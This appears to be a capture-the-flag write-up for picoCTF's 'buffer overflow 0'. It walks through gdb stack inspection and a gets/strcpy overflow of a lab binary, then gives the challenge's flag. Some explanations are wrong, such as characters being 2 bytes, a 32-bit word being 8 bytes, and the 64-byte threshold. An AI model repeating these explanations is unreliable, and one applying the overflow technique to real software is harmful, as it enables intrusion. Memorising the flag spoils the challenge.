# `buffer overflow 0`

https://play.picoctf.org/events/70/challenges/challenge/257

## Description

Smash the stack

Let's start off simple, can you overflow the correct buffer? 

The program is available [here](https://artifacts.picoctf.net/c/520/vuln). You can view source [here](https://artifacts.picoctf.net/c/520/vuln.c). 

And connect with it using:

```bash
nc saturn.picoctf.net 53935
```


## Exploiting

When we run the program for the first time, we see that it's requesting us to create a flag in the directory. Let's do that:

```bash
./vuln
Please create 'flag.txt' in this directory with your own debugging flag.

# As requested above
echo "picoCTF{some_flag}" >> flag.txt
```

After the flag is there, we can see that the program asks us for an input

```bash
./vuln
Input: 
```

If we look at what happens to this input in the source code, we can see that the input is copied into a variable character buffer of size `100` and then passed onto the `vuln` function:

```c
printf("Input: ");
fflush(stdout);
char buf1[100];
gets(buf1); 
vuln(buf1);
```

In the `vuln` method, we see that this buffer is then copied into another variable character of size `16`:

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

So we know that we can overflow the buffer if our input is larger than `16`.

Let's run the program with `gdb` and take a closer look at the program.

```
gdb ./vuln

(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08049e3f <+0>:     endbr32 
   0x08049e43 <+4>:     push   %ebp
   0x08049e44 <+5>:     mov    %esp,%ebp
   0x08049e46 <+7>:     push   %ebx
   0x08049e47 <+8>:     sub    $0x10,%esp
   0x08049e4a <+11>:    call   0x8049f53 <__x86.get_pc_thunk.ax>
   0x08049e4f <+16>:    add    $0x9b1b1,%eax
   0x08049e54 <+21>:    pushl  0x8(%ebp)
   0x08049e57 <+24>:    lea    -0x14(%ebp),%edx
   0x08049e5a <+27>:    push   %edx
   0x08049e5b <+28>:    mov    %eax,%ebx
   0x08049e5d <+30>:    call   0x8049030
   0x08049e62 <+35>:    add    $0x8,%esp
   0x08049e65 <+38>:    nop
   0x08049e66 <+39>:    mov    -0x4(%ebp),%ebx
   0x08049e69 <+42>:    leave  
   0x08049e6a <+43>:    ret
```

We can see that there's a system call at the 30th bit from the beginning of the `vuln` function (`0x08049e5d <+30>:    call   0x8049030`). 
This is likely the location of the `strcpy` instruction where the overflow occurs. Let's put a breakpoint right after this system call to look at the stack and run the program with 20 `U`s:

```
(gdb) b * vuln +35          
Breakpoint 1 at 0x8049e62: file vuln.c, line 18. 

(gdb) r 
Starting program: ~/ctf/pico_2022/binary_exploitation/buffer_overflow_0/vuln
Input: UUUUUUUUUUUUUUUUUUUU

Breakpoint 1, 0x08049e62 in vuln (input=0xffffcae8 'U' <repeats 20 times>)
    at vuln.c:18

```

Let's take a look at the stack:

```
(gdb) i r esp
esp            0xffffcac0          0xffffcac0
(gdb) i r ebp
ebp            0xffffcadc          0xffffcadc
```

So we can see that the stack starts at `0xffffcac0` and ends at `0xffffcadc` meaning the stack size is 1C (in hex) or 28 (decimal).

If we print out the stack contents, we can see that we're one word (8 bytes) short of overwriting the `EBP`:

```
(gdb) x/20x $esp
0xffffcac0:     0xffffcac8      0xffffcae8      0x55555555      0x55555555
0xffffcad0:     0x55555555      0x55555555      0x55555555      0xffffcb00

(gdb) x/x $ebp
0xffffcadc:     0xffffcb00
```

So we need to increase the fuzzing by 4 characters (each character is 2 bytes) so we can overwrite the whole stack. Let's change the 4 letters from `U` to `A` so it's easier to see when examining memory:

```
(gdb) r 

The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: ~/ctf/pico_2022/binary_exploitation/buffer_overflow_0/vuln 
Input: UUUUUUUUUUUUUUUUUUUUAAAA 

Breakpoint 1, 0x08049e62 in vuln (input=0xffffcae8 'U' <repeats 20 times>, "AAAA") at vuln.c:18
18        strcpy(buf2, input);

(gdb) x/20x $esp
0xffffcac0:     0xffffcac8      0xffffcae8      0x55555555      0x55555555
0xffffcad0:     0x55555555      0x55555555      0x55555555      0x41414141
0xffffcae0:     0x08049f00      0xffffcae8      0x55555555      0x55555555

```

We can see from the output that the `EBP` has `0x41414141` (`41` is ASCII code for `A`).

Now that we overwrote/oveflowed the stack, we can overwrite the return address (which is the next `word` after the `EBP`). To find this address, we first need to check where the flag is actually printed.

Reviewing the source code, we see that it happens on the first line after the signal handler function is invoked (line 11):

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  ...
}
```

We can get the flag by having a buffer larger than 64 bytes:

```bash
nc saturn.picoctf.net 53935
Input: UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
```